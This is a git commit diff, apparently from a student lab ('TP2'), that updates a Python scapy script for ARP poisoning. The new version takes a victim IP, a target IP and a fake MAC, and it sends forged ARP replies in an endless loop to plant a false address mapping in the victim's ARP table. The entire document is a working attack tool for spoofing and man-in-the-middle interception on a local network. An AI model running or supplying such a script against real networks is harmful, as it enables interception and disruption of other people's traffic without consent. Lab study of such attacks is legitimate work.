4fd2d595da461d5bdc423718e3f91d04a900bfb7
victorhefrei <157361064+victorhefrei@users.noreply.github.com>
2024-12-02 07:41:17 +0100

    Update arp_poisoning.py

--- TP2/arp_poisoning.py
+++ TP2/arp_poisoning.py
@@ -1,20 +1,22 @@
 from scapy.all import ARP, send
 import sys
 
-def arp_poison(victim_ip, fake_mac):
-    arp_packet = ARP(op=2, pdst=victim_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=fake_mac)
-    print(f"Injecting fake ARP entry: {victim_ip} -> {fake_mac}")
+def arp_poison(victim_ip, target_ip, fake_mac):
+    arp_packet = ARP(op=2, pdst=victim_ip, hwdst="ff:ff:ff:ff:ff:ff", psrc=target_ip, hwsrc=fake_mac)
+    
+    print(f"[INFO] Injecting fake ARP entry: {target_ip} -> {fake_mac} into {victim_ip}'s ARP table.")
     try:
         while True:
             send(arp_packet, verbose=False)
     except KeyboardInterrupt:
-        print("\nARP Poisoning stopped.")
+        print("\n[INFO] ARP Poisoning stopped.")
 
 if __name__ == "__main__":
-    if len(sys.argv) != 3:
-        print("Usage: python arp_poisoning.py <victim_ip> <fake_mac>")
+    if len(sys.argv) != 4:
+        print("Usage: python arp_poisoning.py <victim_ip> <target_ip> <fake_mac>")
         sys.exit(1)
     
     victim_ip = sys.argv[1]
-    fake_mac = sys.argv[2]
-    arp_poison(victim_ip, fake_mac)
+    target_ip = sys.argv[2]
+    fake_mac = sys.argv[3]
+    arp_poison(victim_ip, target_ip, fake_mac)
